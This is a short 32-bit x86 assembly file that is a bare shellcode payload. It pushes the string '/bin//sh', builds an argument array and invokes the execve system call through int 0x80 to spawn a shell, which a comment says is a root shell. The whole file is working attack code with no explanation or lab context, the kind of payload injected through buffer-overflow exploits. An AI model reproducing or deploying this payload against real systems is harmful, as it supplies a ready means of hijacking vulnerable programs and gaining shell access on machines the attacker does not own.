# for 32-bit
# execute /bin/sh (root)
.data
.text
.global _start

_start:
  xor %eax, %eax
  push %eax
  push $0x68732f2f
  push $0x6e69622f
  mov %esp, %ebx
  push %eax
  push %ebx
  mov %esp, %ecx
  mov $0xb, %al
  int $0x80
